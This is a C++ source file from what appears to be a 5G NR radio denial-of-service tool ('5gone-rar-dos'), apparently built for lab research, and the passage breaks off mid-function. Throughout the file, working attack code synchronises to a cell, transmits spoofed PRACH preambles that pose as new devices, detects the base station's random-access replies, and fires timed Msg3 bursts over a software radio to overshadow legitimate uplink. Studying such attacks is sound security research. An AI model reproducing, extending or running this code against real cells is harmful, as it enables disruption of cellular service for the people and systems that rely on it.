#include "5gone/attack_engine.hpp"
#include "5gone/cell_sync.hpp"
#include "5gone/empty_mac_pdu.hpp"
#include "5gone/latency.hpp"
#include "5gone/nr_capture.hpp"
#include "5gone/nr_ofdm.hpp"
#include "5gone/nr_pss.hpp"
#include "5gone/nr_rar_decoder.hpp"
#include "5gone/nr_rar_tx.hpp"
#include "5gone/nr_prach.hpp"
#include "5gone/pusch_encoder.hpp"
#include "5gone/radio_uhd.hpp"
#include "5gone/rar_monitor.hpp"
#include "5gone/sample_clock.hpp"
#include "5gone/tdd_gate.hpp"
#include "5gone/ul_gate.hpp"
#include <algorithm>
#include <chrono>
#include <cmath>
#include <cstdio>
#include <ctime>
#include <fstream>
#include <iostream>
#include <iomanip>
#include <memory>
#include <numeric>
#include <regex>
#include <set>
#include <thread>

namespace gone {

static std::ofstream& attack_log(const AttackConfig& cfg)
{
  static std::ofstream log;
  static std::string path;
  if (path != cfg.log_file) {
    path = cfg.log_file;
    log.open(path, std::ios::app);
  }
  return log;
}

// Wall-clock [HH:MM:SS] prefix for the key [prach] lines. att.log is stdout
// redirected, otherwise un-timestamped, which made cross-log forensics with
// the gNB log impossible (an entire session was once misread as "gNB silent"
// before anyone noticed the timestamps disagreed by hours).
static std::string wall_ts()
{
  const std::time_t t = std::time(nullptr);
  char buf[16];
  if (std::strftime(buf, sizeof buf, "%H:%M:%S", std::localtime(&t)) == 0) buf[0] = '\0';
  return std::string("[") + buf + "]";
}

// FNV-1a hash of a burst: proves dither/CFO steps actually emit distinct
// waveforms (a previous revision rebuilt "per step" yet emitted bit-identical
// bursts across the whole sub-bin span).
static uint64_t burst_hash(const SampleBuffer& s)
{
  uint64_t h = 1469598103934665603ull;
  const unsigned char* p = reinterpret_cast<const unsigned char*>(s.data());
  const std::size_t n = s.size() * sizeof(Sample);
  for (std::size_t i = 0; i < n; ++i) { h ^= p[i]; h *= 1099511628211ull; }
  return h;
}

static void log_attack(const AttackConfig& cfg, const RarEvent& ev, double advance_us, bool tx_ok)
{
  auto& log = attack_log(cfg);
  log << std::fixed << std::setprecision(1)
      << "Attacking RAR rapid=" << static_cast<int>(ev.rapid)
      << " c_rnti=" << ev.c_rnti
      << " k=" << static_cast<int>(ev.grant.k)
      << " freq_res=" << ev.grant.pusch_freq_res
      << " symbol0_advance_us=" << advance_us
      << " tx_ok=" << (tx_ok ? "true" : "false") << "\n";
  log.flush();
  std::cout << "[attack] RAR rapid=" << static_cast<int>(ev.rapid)
            << " TC-RNTI=0x" << std::hex << ev.c_rnti << std::dec
            << " advance=" << advance_us << "µs"
            << (tx_ok ? " TX" : " DRY") << "\n";
}

AttackEngine::AttackEngine(AttackConfig cfg) : cfg_(std::move(cfg)) {}

SampleBuffer AttackEngine::build_msg3(const RarEvent& ev)
{
  PuschEncoder encoder(cfg_);
  const std::size_t tb_bytes = ev.grant.tbs_bits / 8;
  return encoder.encode(ev.grant, build_empty_mac_pdu(tb_bytes));
}

void AttackEngine::execute_attack(const RarEvent& ev)
{
  auto iq = build_msg3(ev);
  if (iq.empty()) {
    std::cerr << "[attack] empty IQ — check iq_templates/ or grant params\n";
    log_attack(cfg_, ev, cfg_.symbol_advance_us, false);
    return;
  }

  const double advance_sec = cfg_.symbol_advance_us / 1e6;
  const double k_slot_sec = ev.grant.k * TddGate(cfg_.scs_khz).slot_duration_sec();
  const double delay = std::max(0.0, k_slot_sec - advance_sec);

  if (cfg_.dry_run || cfg_.mode == "sim") {
    log_attack(cfg_, ev, cfg_.symbol_advance_us, false);
    return;
  }

  try {
    if (shared_radio_) {
      shared_radio_->transmit(iq, delay);
      log_attack(cfg_, ev, cfg_.symbol_advance_us, true);
    } else {
      RadioUhd radio(cfg_);
      radio.transmit(iq, delay);
      log_attack(cfg_, ev, cfg_.symbol_advance_us, true);
    }
  } catch (const std::exception& e) {
    std::cerr << "[attack] radio error: " << e.what() << "\n";
    log_attack(cfg_, ev, cfg_.symbol_advance_us, false);
  }
}

void AttackEngine::execute_attack_timed(const RarEvent& ev, const UlGrantWindow& win,
                                        RadioUhd& radio)
{
  auto iq = build_msg3(ev);
  if (iq.empty()) {
    std::cerr << "[attack] empty IQ — check iq_templates/ or grant params\n";
    log_attack(cfg_, ev, cfg_.symbol_advance_us, false);
    return;
  }

  if (cfg_.dry_run || cfg_.mode == "sim") {
    std::printf("[attack] DRY-scheduled rapid=%u TC-RNTI=0x%X Msg3 slot=%llu "
                "tx_time=%+.3f ms ahead=%.3f ms (no TX)\n",
                ev.rapid, ev.c_rnti, (unsigned long long)win.msg3_abs_slot,
                (win.tx_abs_time_sec - radio.uhd_now_sec()) * 1e3,
                win.tx_ahead_sec * 1e3);
    log_attack(cfg_, ev, cfg_.symbol_advance_us, false);
    return;
  }

  // UHD timed TX must be submitted with the target still ahead (B200 retimes
  // the burst in-device, but it needs *some* lead). If the decode pipeline
  // already outran the K2 window, this RAR is simply too late to overshadow.
  constexpr double kMinTimedTxLeadSec = 0.001;
  if (win.tx_ahead_sec < kMinTimedTxLeadSec) {
    std::printf("[attack] Msg3 slot %llu in the past (ahead=%.3f ms) — too late\n",
                (unsigned long long)win.msg3_abs_slot, win.tx_ahead_sec * 1e3);
    log_attack(cfg_, ev, cfg_.symbol_advance_us, false);
    return;
  }

  try {
    radio.transmit_timed(iq, win.tx_abs_time_sec);
    log_attack(cfg_, ev, cfg_.symbol_advance_us, true);
  } catch (const std::exception& e) {
    std::cerr << "[attack] radio error: " << e.what() << "\n";
    log_attack(cfg_, ev, cfg_.symbol_advance_us, false);
  }
}

int AttackEngine::run_sim()
{
  RarMonitor mon(cfg_);
  const std::string ds = cfg_.dataset_dir.empty()
      ? "data/5gone-dataset" : cfg_.dataset_dir;

  std::cout << "[sim] replay RAR DoS from dataset: " << ds << "\n";
  auto events = mon.load_grants_from_dataset(ds);
  if (events.empty()) {
    std::cerr << "[sim] no RAR events — run: bash scripts/setup-lab.sh --phase 0\n";
    return 1;
  }

  cfg_.dry_run = true;
  std::size_t n = 0;
  for (const auto& ev : events) {
    if (stop_.load()) break;
    execute_attack(ev);
    ++n;
    if (n >= 10) break; // demo cap
  }
  std::cout << "[sim] processed " << n << " RAR attacks (dry-run)\n";
  return 0;
}

int AttackEngine::run_inject()
{
  if (cfg_.grant_file.empty()) {
    std::cerr << "[inject] --grant FILE required\n";
    return 1;
  }
  RarMonitor mon(cfg_);
  auto events = mon.load_grants_from_file(cfg_.grant_file);
  if (events.empty()) {
    std::cerr << "[inject] no grants in " << cfg_.grant_file << "\n";
    return 1;
  }

  std::cout << "[inject] " << events.size() << " grant(s) from " << cfg_.grant_file << "\n";
  for (const auto& ev : events) {
    if (stop_.load()) break;
    execute_attack(ev);
  }
  return 0;
}

int AttackEngine::run_live()
{
  // Path-2 live overshadow: self-trigger a REAL RAR with the fake Msg1 (B4
  // preamble on the gNB's PRACH occasion), detect the gNB's Msg2 reply with the
  // slot-aware DMRS window scan (P2-1 — no DCI bits needed, the null-calibrated
  // polar link yields none), and overshadow with the cell's CONSTANT grant
  // (P2-2) timed onto the RAR's UL slot (Step 4). Detection confirms the grant
  // is really pending; the constant grant replaces the bits we cannot decode.
  std::cout << "[live] RAR DoS — self-trigger Msg1 + Path-2 DMRS-detection "
               "constant-grant overshadow\n";
  std::cout << "[live] detection: slot-aware DMRS scan (corr >= "
            << cfg_.live_fire_corr << "), no polar decode\n";
  std::cout << "[build] 5gone-rar-dos built " << __DATE__ << " " << __TIME__
            << " (if this predates your last sync, the binary is stale — rebuild)\n";

  // Path-2 (P2-2): the constant grant the gNB schedules for a B4 preamble on
  // this cell, plus the sequential TC-RNTI tracker (gNB assigns 0x4601, 0x4602,
  // ... per RAR; the tracker clones the sequence once a seed is known).
  RarMonitor::TcRntiTracker tc_tracker;
  if (cfg_.live_tc_rnti_seed) tc_tracker.reseed(cfg_.live_tc_rnti_seed);

  RarMonitor mon(cfg_);
  CellSync sync(cfg_);
  TddGate tdd(cfg_.scs_khz);

  try {
    RadioUhd radio(cfg_);
    if (cfg_.prach.tx_gain_db >= 0.0) {
      radio.set_tx_gain(cfg_.prach.tx_gain_db);
      std::printf("[live] TX gain override: %.1f dB (was %.1f dB)\n",
                  cfg_.prach.tx_gain_db, radio.get_tx_gain());
    }
    // One shared device clock: epoch 0 = here, so every RX packet's time-stamp
    // maps to an absolute sample index via rx_sample_from_time() and the later
    // TDD/TX scheduling uses the same clock (Step 2/4).
    radio.sync_time(0.0);
    radio.start_streaming();
    // Must hold at least one full SSB slot (7680 samples @ 23.04 MHz / 30 kHz)
    // plus lead-in, so find_ssb() can lock mid-stream (Step 3).
    SampleBuffer buf(16384);
    std::size_t rounds = 0;
    uint64_t rx_global_sample = 0;   // absolute receive-sample clock
    bool have_rx_time = false;
    double cfo_hz = 0.0;
    nr::PrachPreamble burst;
    bool burst_built = false;
    double built_cfo = 0.0;           // carrier offset baked into `burst`
    unsigned built_rapid = 9999;      // RAPID baked into `burst` (rebuild on change)
    uint32_t dither_idx = 0;          // advances one step per sent occasion
    uint64_t last_refine_slot = ~0ull;// frame-slot-0 we last CFO-refined on
    constexpr uint32_t kCfoAccumFrames = 6;  // SSB frames to average before burst use
    constexpr double kMinPrachLeadSec = 0.001;  // UHD timed TX anchor lead
    uint64_t last_armed_slot = ~0ull;
    uint64_t sent = 0;
    uint64_t fired = 0;
    uint64_t last_occ_slot = ~0ull;   // absolute slot of the last TX'd occasion
    unsigned last_sent_rapid = 0;     // RAPID that last preamble claimed
    uint64_t last_fired_abs_slot = ~0ull; // dedupe: one fire per RAR slot
    // Msg2 reply window after our occasion. The gNB schedules the RAR PDCCH+PDSCH
    // on the slot(s) right after the PRACH occasion (gNB logs [X.9] then [X.10]);
    // srsRAN default RAR response window is generous, so 4 slots covers it.
    constexpr uint64_t kRarWindowSlots = 4;

    while (!stop_.load() && rounds < 100000) {
      bool got_time = false;
      double t_rx = 0.0;
      const std::size_t n = radio.recv_timed(buf, 0.05, got_time, t_rx);
      if (got_time) {
        // UHD stamped this packet's first sample: re-anchor the global clock
        // to it (self-healing against any earlier drift / dropped packets).
        rx_global_sample = rx_sample_from_time(t_rx, cfg_.sample_rate);
        if (!have_rx_time) {
          std::printf("[live] first RX stamp t=%.9f s -> rx_global_sample=%llu\n",
                      t_rx, static_cast<unsigned long long>(rx_global_sample));
        }
        have_rx_time = true;
      } else if (have_rx_time && n > 0) {
        // No stamp (overflow/late): keep the clock monotonic by hand.
        rx_global_sample += n;
      }
      sync.set_rx_now(rx_global_sample);

      // Acquire / hold the frame lock from the SSB in the stream. Throttled:
      // the sliding PSS corr is the expensive step and the RX queue is fragile
      // (every extra ~100 ms of processing shows up as overshoot/stall).
      if (have_rx_time && !sync.locked() && (rounds % 4u) == 0u) {
        SsbResult res;
        if (sync.find_ssb(buf, res)) {
          sync.set_frame_start_global(rx_global_sample + res.slot_start);
          cfo_hz = res.cfo_hz;
          std::printf("%s [live] SSB lock: frame_start=%llu strength=%.3f cfo=%.1fHz "
                      "(cfomag=%.2g) k_ssb=%d pss=%.3f@%+d sss=%.3f@%+d\n",
                      wall_ts().c_str(),
                      static_cast<unsigned long long>(sync.frame_start_sample()),
                      res.strength, cfo_hz, res.cfo_mag, res.subcarrier_offset,
                      res.pss_corr, res.pss_off, res.sss_corr, res.sss_off);
        }
      }
      if (!sync.locked()) { ++rounds; continue; }

      // Two-phase lock verification: a fresh find_ssb() lock is a CANDIDATE
      // until the SSB reproduces on the 20 ms frame grid for kVerifyHitsNeeded
      // frames. Without this a dead cell still hands a spurious lock and the
      // run blind-fires preambles into the void (observed in run g16).
      const auto cur_g = sync.current_slot();
      if (cur_g && ((*cur_g % 20u) == 0u) && *cur_g != last_refine_slot &&
          sync.verify_in_progress()) {
        const uint64_t tol =
            static_cast<uint64_t>(3.0 * sync.samples_per_slot() + 0.5);
        const CellSync::VerifyEvent ev =
            sync.verify_frame(buf, rx_global_sample, tol);
        if (ev == CellSync::VerifyEvent::Confirmed) {
          std::printf("%s [live] lock CONFIRMED: SSB reproduced on frame grid — TX enabled\n",
                      wall_ts().c_str());
        } else if (ev == CellSync::VerifyEvent::Broken) {
          std::printf("%s [live] lock REJECTED: SSB did NOT reproduce on the "
                      "frame grid (no cell?) — rescanning, NO TX\n",
                      wall_ts().c_str());
        }
        last_refine_slot = *cur_g;
      }
      if (!sync.locked() || sync.verify_in_progress()) { ++rounds; continue; }

      // Average the CFO over SSB frames (once per frame-slot-0) so the burst's
      // carrier center is a stable mean instead of the +-10 kHz one-shot CP
      // estimate (the rig's SSB sits right at the gate, so single reads swing).
      if ((cfg_.prach.live_scan || cfg_.prach.auto_cfo) &&
          sync.cfo_frames() < kCfoAccumFrames) {
        const auto cur = sync.current_slot();
        if (cur && ((*cur % 20u) == 0u) && *cur != last_refine_slot) {
          SsbResult rres;
          if (sync.refine_cfo(buf, rres)) {
            last_refine_slot = *cur;
            if (sync.cfo_frames() == kCfoAccumFrames) {
              std::printf("%s [live] cfo averaged to %.0f Hz over %u SSB frames\n",
                          wall_ts().c_str(),
                          sync.cfo_avg_hz(), (unsigned)sync.cfo_frames());
            }
          }
        }
      }

      // Carrier offset for THIS occasion: auto uses the (averaged) measured CFO,
      // otherwise the manual override; with dither_cfo we sweep one step per
      // occasion so every pass lands a step inside the gNB PRACH detector comb.
      const double cfo_center = cfg_.prach.auto_cfo
          ? (sync.cfo_frames() ? sync.cfo_avg_hz() : cfo_hz)
          : cfg_.prach.cfo_comp_hz;
      double eff_cfo = cfo_center;
      uint32_t dither_steps = 1;
      if (cfg_.prach.dither_cfo && cfg_.prach.dither_step_hz > 0.0) {
        const uint32_t half = static_cast<uint32_t>(std::lround(
            cfg_.prach.dither_halfspan_hz / cfg_.prach.dither_step_hz));
        dither_steps = 2u * half + 1u;
        const uint32_t idx = dither_idx % dither_steps;
        eff_cfo = cfo_center + (static_cast<double>(idx) - static_cast<double>(half))
                      * cfg_.prach.dither_step_hz;
      }
      const unsigned rapid_eff = cfg_.prach.cycle_rapids
          ? (static_cast<unsigned>(cfg_.prach.rapid) +
             static_cast<unsigned>(sent % 64u)) % 64u
          : static_cast<unsigned>(cfg_.prach.rapid);

      // (Re)build the Msg1 burst only when the effective carrier/rapid changed.
      if (!burst_built || std::abs(eff_cfo - built_cfo) > 250.0 ||
          rapid_eff != built_rapid) {
        const uint16_t prbs = static_cast<uint16_t>(std::min(
            51, static_cast<int>(cfg_.bandwidth_mhz * 1000.0 /
                                 (12.0 * static_cast<double>(cfg_.scs_khz)))));
        burst = nr::synth_prach_b4(cfg_.prach.root_sequence_index, rapid_eff,
                                   prbs, cfg_.scs_khz * 1000.0, cfg_.sample_rate,
                                   cfg_.prach.msg1_frequency_start_prb, eff_cfo);
        if (burst.samples.empty()) {
          std::cerr << "[live] Msg1 burst synthesis failed\n";
          return 1;
        }
        double rms = 0.0;
        for (const auto& v : burst.samples) rms += std::norm(v);
        rms = std::sqrt(rms / burst.samples.size());
        if (!burst_built) {
          std::printf("%s [live] preamble: %zu samples (%.0f us) f0_bin=%lld "
                      "cfo_comp=%.0f Hz resid=%+.1f Hz hash=%016llx rms=%.3f\n",
                      wall_ts().c_str(),
                      burst.samples.size(), burst.duration_sec * 1e6,
                      static_cast<long long>(burst.f0_bin), eff_cfo,
                      burst.cfo_residual_hz,
                      static_cast<unsigned long long>(burst_hash(burst.samples)),
                      rms);
        }
        built_cfo = eff_cfo;
        built_rapid = rapid_eff;
        burst_built = true;
      }

      // Arm the next PRACH occasion against the LIVE device clock (the RX
      // stamp trails real time by the whole RX pipeline; scheduling off it
      // fired occasions already in the past).
      const double now_sec = radio.uhd_now_sec();
      const uint64_t now_sample = rx_sample_from_time(now_sec, cfg_.sample_rate);
      const uint8_t eff_slot = cfg_.prach.sweep_occasion_slots
          ? static_cast<uint8_t>((cfg_.prach.occasion_slot + sent) % 20)
          : cfg_.prach.occasion_slot;
      const uint64_t occ = nr::next_prach_occasion_start(
          sync.frame_start_sample(), sync.samples_per_slot(), now_sample, eff_slot);
      const uint64_t occ_slot = static_cast<uint64_t>(std::llround(
          static_cast<double>(occ - sync.frame_start_sample()) / sync.samples_per_slot()));
      if (occ_slot != last_armed_slot) {
        last_armed_slot = occ_slot;
        const bool count_hit =
            cfg_.prach.occasion_count && sent >= cfg_.prach.occasion_count;
        const double occ_sec = rx_time_from_sample(occ, cfg_.sample_rate);
        const double tx_sec = occ_sec - cfg_.symbol_advance_us / 1e6;
        const double ahead = tx_sec - now_sec;
        if (ahead >= kMinPrachLeadSec && ahead <= 0.1 && !count_hit) {
          // gating MODEL: the Msg3 the RAR will schedule at occ+k2 must be a
          // UL slot — a real gNB never schedules Msg3 on a DL slot, and firing
          // there would be pure noise. Pre-check the TDD slot we *expect* to
          // land on once this occasion's RAR arrives (visualized in the
          // [live] Msg3 window line at fire time, but skip the preamble now if
          // it is structurally impossible).
          if (cfg_.dry_run) {
            std::printf("[live] DRY: preamble->slot=%llu rapid=%u tx_time=%+.3f ms\n",
                        (unsigned long long)occ_slot, rapid_eff,
                        (tx_sec - radio.uhd_now_sec()) * 1e3);
          } else {
            radio.transmit_timed(burst.samples, tx_sec);
            std::printf("%s [live] TX Msg1 -> slot=%llu (frame=%llu subframe=%d) "
                        "rapid=%u ahead=%.3f ms (sent %llu) cfo=%.0f Hz\n",
                        wall_ts().c_str(),
                        (unsigned long long)occ_slot,
                        (unsigned long long)(occ_slot / 20), (int)((occ_slot % 20) / 2),
                        rapid_eff,
                        (tx_sec - radio.uhd_now_sec()) * 1e3, (unsigned long long)(sent + 1),
                        eff_cfo);
          }
          if (cfg_.prach.dither_cfo && dither_steps > 1) ++dither_idx;
          last_occ_slot = occ_slot;
          last_sent_rapid = rapid_eff;
          ++sent;
        }
      }

      // Path-2 detection: slot-aware DMRS scan of this RX buffer, labelled on
      // the (frame_start, samples_per_slot) clock (P2-1). Reports every
      // candidate >= 0.5; the fire gate below applies the live_fire_corr fence.
      const uint64_t frame_start = sync.frame_start_sample();
      const double sps = sync.samples_per_slot();
      auto hits = mon.scan_window(buf, rx_global_sample, frame_start, sps,
                                  sync.cfo_frames() ? sync.cfo_avg_hz() : cfo_hz);
      mon.note_hits_for_sib(hits);
      if ((rounds % 100u) == 0u && sync.locked()) mon.report_sib_clusters();

      // Fire: a strong hit inside the reply window after OUR occasion is the
      // Msg2 the gNB granted to our fake Msg1. P2-5 gates on RAR-window
      // membership (never on a learned SIB bucket — firing stays honest even
      // when SIB1 happens to sit inside the window).
      if (last_occ_slot != ~0ull) {
        for (const auto& h : hits) {
          if (h.corr < cfg_.live_fire_corr) continue;
          if (h.abs_slot <= last_occ_slot ||
              h.abs_slot > last_occ_slot + kRarWindowSlots) continue;
          if (h.abs_slot == last_fired_abs_slot) continue;   // multi-config dedupe
          last_fired_abs_slot = h.abs_slot;

          RarMonitor::RarGrant g = RarMonitor::static_grant(
              tc_tracker.seeded() ? tc_tracker.next() : 0);
          // RarGrant defaults = the cell's constant RAR grant (k2=4, rb=[0..3),
          // mcs 0, tpc 0, ta 0). Header docs: CALIBRATE after the first real
          // firing (rb_len/k2 semantics are riv-encoded via rar_event_from_slot_hit).
          const RarEvent ev = RarMonitor::rar_event_from_slot_hit(
              h, g, last_sent_rapid, rx_global_sample, frame_start, sps,
              nr::bwp_num_prbs);

          const UlGrantWindow win = compute_ul_grant_window(
              sync, tdd, rx_global_sample, ev, cfg_, radio.uhd_now_sec());
          if (!win.valid) {
            std::printf("[live] RAR rapid=%u @slot=%llu: no gated Msg3 window\n",
                        ev.rapid, (unsigned long long)h.abs_slot);
            continue;
          }
          if (!win.ul_ok) {
            std::printf("[live] RAR rapid=%u @slot=%llu corr=%.3f: Msg3 slot %llu "
                        "is DL (DDDSU) — skipping overshadow\n",
                        ev.rapid, (unsigned long long)h.abs_slot, h.corr,
                        (unsigned long long)win.msg3_abs_slot);
            continue;
          }
          std::printf("[live] Msg2 detect: rapid=%u TC-RNTI=0x%X slot=%llu corr=%.3f "
                      "al=%u cand=%u dur=%u off=%u%s — Msg3 window slot=%llu tx=%+.3f ms\n",
                      ev.rapid, ev.c_rnti, (unsigned long long)h.abs_slot, h.corr,
                      (unsigned)h.al, (unsigned)h.candidate, (unsigned)h.duration,
                      (unsigned)h.start_prb, h.interleaved ? " (interleaved)" : "",
                      (unsigned long long)win.msg3_abs_slot,
                      (win.tx_abs_time_sec - radio.uhd_now_sec()) * 1e3);
          if (!cfg_.dry_run) {
            execute_attack_timed(ev, win, radio);
            ++fired;
          } else {
            std::printf("[live] DRY: would fire constant-grant Msg3 (slot %llu)\n",
                        (unsigned long long)win.msg3_abs_slot);
          }
        }
      }
      ++rounds;
    }

    radio.stop_streaming();
    std::cout << wall_ts() << " [live] summary: locked=" << (sync.locked() ? "yes" : "no")
              << " preambles_sent=" << sent << " overshadow_fired=" << fired
              << " tx_underrun=" << radio.tx_underrun_count()
              << " rx_overflow=" << radio.rx_overflow_count()
              << " rx_lost=" << radio.rx_lost_count()
              << " cfo_avg=" << (sync.cfo_frames() ? sync.cfo_avg_hz() : cfo_hz)
              << " Hz\n";
    return sent > 0 || fired > 0 || cfg_.dry_run ? 0 : 1;
  } catch (const std::exception& e) {
    std::cerr << "[live] " << e.what() << "\n";
    return 1;
  }
}

int AttackEngine::run_prach()
{
  // Step 5 (Msg1 trigger): broadcast a B4 (short, L_RA=139, 30 kHz) ZC preamble
  // on the lab gNB's PRACH occasion so the gNB hands our loop a REAL RAR.
  // Config index 159: every frame, subframe 9 -> 30 kHz slot 19, symbol 0..11,
  // timed with the shared UHD clock (CellSync frame lock first).
  std::cout << "[prach] PRACH Msg1 sender — B4 (139/30kHz) on the derived gNB occasion\n";
  std::cout << "[prach] = RAR self-trigger for the live overshadow loop\n";
  std::cout << "[build] 5gone-rar-dos built " << __DATE__ << " " << __TIME__
            << " (if this predates your last sync, the binary is stale — rebuild)\n";
  if (cfg_.prach.sweep_occasion_slots)
    std::cout << wall_ts() << " [prach] occasion-slot sweep ON: cycling 0..19 from base "
              << static_cast<unsigned>(cfg_.prach.occasion_slot)
              << " across sends within this lock\n";

  CellSync sync(cfg_);
  RarMonitor mon(cfg_);
  try {
    RadioUhd radio(cfg_);
    if (cfg_.prach.tx_gain_db >= 0.0) {
      radio.set_tx_gain(cfg_.prach.tx_gain_db);
      std::printf("[prach] TX gain override: %.1f dB (was %.1f dB)\n",
                  cfg_.prach.tx_gain_db, radio.get_tx_gain());
    }
    radio.sync_time(0.0);
    radio.start_streaming();
    SampleBuffer buf(16384);
    std::size_t rounds = 0;
    uint64_t rx_global_sample = 0;
    bool have_rx_time = false;
    double cfo_hz = 0.0;
    nr::PrachPreamble burst;
    bool burst_built = false;
    double built_cfo = 0.0;         // carrier offset baked into `burst`
    unsigned built_rapid = 9999;      // RAPID baked into `burst` (rebuild on change)
    double last_tx_cfo = 0.0;       // offset of the most recent transmitted burst
    uint32_t dither_idx = 0;        // advances one step per sent occasion
    uint64_t dither_passes = 0;     // completed full dither sweeps
    uint64_t last_refine_slot = ~0ull; // frame-slot-0 we last CFO-refined on
    constexpr uint32_t kCfoAccumFrames = 6;  // SSB frames to average before burst use
    uint64_t last_armed_slot = ~0ull;
    bool armed_any = false;
    uint64_t sent = 0;
    // RAR-window OTA capture (offline decode of the gNB's Msg2).
    bool capture_armed = false;         // target occasion fixed for a window
    bool tail_armed = false;            // post-count tail recording (once/run)
    bool capture_done = false;          // capture exactly one RAR window per run
    uint64_t capture_from = 0;          // absolute sample where the RAR window starts
    uint64_t captured = 0;              // samples written so far (this attempt)
    uint64_t capture_win_samples = 0;   // window length in samples (this attempt)
    uint64_t capture_file_start = 0;    // absolute sample of file sample 0
    uint64_t capture_attempt = 0;       // arm counter (numbered files, never clobber)
    uint64_t capture_overshoots = 0;    // RX-head jumps that killed an attempt
    uint64_t capture_gaps = 0;          // mid-file time gaps written contiguously
    uint64_t capture_gap_samples = 0;   // samples missing inside those gaps
    uint64_t last_captured = 0;         // bytes of the most recent attempt
    std::string last_capture_path;      // file of the most recent attempt
    double drain_deadline_sec = 0.0;    // wall clock: hard stop for post-count drain
    std::ofstream cap_file;

    while (!stop_.load() && rounds < 100000) {
      bool got_time = false;
      double t_rx = 0.0;
      const std::size_t n = radio.recv_timed(buf, 0.05, got_time, t_rx);
      if (got_time) {
        rx_global_sample = rx_sample_from_time(t_rx, cfg_.sample_rate);
        if (!have_rx_time) {
          std::printf("[prach] first RX stamp t=%.9f s -> rx_global_sample=%llu\n",
                      t_rx, static_cast<unsigned long long>(rx_global_sample));
        }
        have_rx_time = true;
      } else if (have_rx_time && n > 0) {
        rx_global_sample += n;
      }
      sync.set_rx_now(rx_global_sample);

      if (have_rx_time && !sync.locked() && (rounds % 4u) == 0u) {
        // Throttled: sliding PSS corr costs ~50-200 ms per buffer against
        // 0.7 ms of air, so searching every buffer explodes the RX queue
        // (the ~1 s lags + early overflow jumps that trim captures). Every
        // 4th buffer still locks within a few SSB periods.
        SsbResult res;
        if (sync.find_ssb(buf, res)) {
          sync.set_frame_start_global(rx_global_sample + res.slot_start);
          cfo_hz = res.cfo_hz;
          // framemod pins the lock to the 20 ms frame: runs whose working
          // occasion_slot differs must show framemod differing by exactly the
          // slot delta x slot length (beam lottery), else the model is wrong.
          const uint64_t frame_samps =
              static_cast<uint64_t>(20.0 * sync.samples_per_slot());
          const uint64_t frame_mod =
              frame_samps ? sync.frame_start_sample() % frame_samps : 0;
          std::printf("%s [prach] SSB lock: frame_start=%llu framemod=%llu "
                      "strength=%.3f cfo=%.1fHz (cfomag=%.2g) k_ssb=%d "
                      "pss=%.3f@%+d sss=%.3f@%+d\n",
                      wall_ts().c_str(),
                      static_cast<unsigned long long>(sync.frame_start_sample()),
                      static_cast<unsigned long long>(frame_mod),
                      res.strength, cfo_hz, res.cfo_mag, res.subcarrier_offset,
                      res.pss_corr, res.pss_off, res.sss_corr, res.sss_off);
        }
      }
      if (!sync.locked()) { ++rounds; continue; }

      // Two-phase lock verification (see run_live): a candidate lock must
      // reproduce the SSB on the frame grid before the [prach] loop TXes.
      const auto cur_g = sync.current_slot();
      if (cur_g && ((*cur_g % 20u) == 0u) && *cur_g != last_refine_slot &&
          sync.verify_in_progress()) {
        const uint64_t tol =
            static_cast<uint64_t>(3.0 * sync.samples_per_slot() + 0.5);
        const CellSync::VerifyEvent ev =
            sync.verify_frame(buf, rx_global_sample, tol);
        if (ev == CellSync::VerifyEvent::Confirmed) {
          std::printf("%s [prach] lock CONFIRMED: SSB reproduced on grid — TX enabled\n",
                      wall_ts().c_str());
        } else if (ev == CellSync::VerifyEvent::Broken) {
          std::printf("%s [prach] lock REJECTED: SSB did NOT reproduce on the "
                      "frame grid (no cell?) — rescanning, NO TX\n",
                      wall_ts().c_str());
        }
        last_refine_slot = *cur_g;
      }
      if (!sync.locked() || sync.verify_in_progress()) { ++rounds; continue; }

      // Average the CFO over SSB frames (once per frame-slot-0) so the burst's
      // carrier center is a stable mean instead of the +-10 kHz one-shot CP
      // estimate (the rig's SSB sits right at the gate, so single reads swing).
      // Skipped for pure capture runs with manual CFO comp: each refine costs
      // a full TD search + slot demod (~100 ms of processing) right when the
      // capture window is open — a prime overshoot source — and nothing reads
      // the average unless auto_cfo is on.
      if ((cfg_.prach.live_scan || cfg_.prach.auto_cfo) &&
          sync.cfo_frames() < kCfoAccumFrames) {
        const auto cur = sync.current_slot();
        if (cur && ((*cur % 20u) == 0u) && *cur != last_refine_slot) {
          SsbResult rres;
          if (sync.refine_cfo(buf, rres)) {
            last_refine_slot = *cur;
            if (sync.cfo_frames() == kCfoAccumFrames) {
              std::printf("%s [prach] cfo averaged to %.0f Hz over %u SSB frames\n",
                          wall_ts().c_str(),
                          sync.cfo_avg_hz(), (unsigned)sync.cfo_frames());
            }
          }
        }
      }

      // Carrier offset for THIS occasion: auto uses the (averaged) measured
      // CFO, otherwise the manual override. With dither_cfo we sweep one step
      // per occasion around that center, so every pass at least one step lands
      // inside the gNB PRACH detector's comb (observed: ~0 / +8000 / +12000 Hz
      // hit, +-4000 dead for this rig) instead of betting the whole run on one
      // value that the LO/comb may have drifted from since the last boot.
      const double cfo_center = cfg_.prach.auto_cfo
          ? (sync.cfo_frames() ? sync.cfo_avg_hz() : cfo_hz)
          : cfg_.prach.cfo_comp_hz;
      double eff_cfo = cfo_center;
      uint32_t dither_steps = 1;
      if (cfg_.prach.dither_cfo && cfg_.prach.dither_step_hz > 0.0) {
        const uint32_t half = static_cast<uint32_t>(std::lround(
            cfg_.prach.dither_halfspan_hz / cfg_.prach.dither_step_hz));
        dither_steps = 2u * half + 1u;
        const uint32_t idx = dither_idx % dither_steps;
        eff_cfo = cfo_center + (static_cast<double>(idx) - static_cast<double>(half))
                      * cfg_.prach.dither_step_hz;
      }

      // RAPID for THIS send: same-rapid repeats appear suppressed after the
      // first couple answers (gNB treats them as dupes while the procedure
      // pends), so each send claims the next RAPID — every preamble looks
      // like a new UE, and gNB `preamble=k` + MAC RAPID echoes map 1:1 back
      // to sends with zero clock dependence.
      const unsigned rapid_eff = cfg_.prach.cycle_rapids
          ? (static_cast<unsigned>(cfg_.prach.rapid) +
             static_cast<unsigned>(sent % 64u)) % 64u
          : static_cast<unsigned>(cfg_.prach.rapid);

      // (Re)build the burst only when the effective carrier actually changed.
      if (!burst_built || std::abs(eff_cfo - built_cfo) > 250.0 ||
          rapid_eff != built_rapid) {
        const uint16_t prbs = static_cast<uint16_t>(std::min(
            51, static_cast<int>(cfg_.bandwidth_mhz * 1000.0 /
                                 (12.0 * static_cast<double>(cfg_.scs_khz)))));
        burst = nr::synth_prach_b4(cfg_.prach.root_sequence_index, rapid_eff,
                                   prbs, cfg_.scs_khz * 1000.0, cfg_.sample_rate,
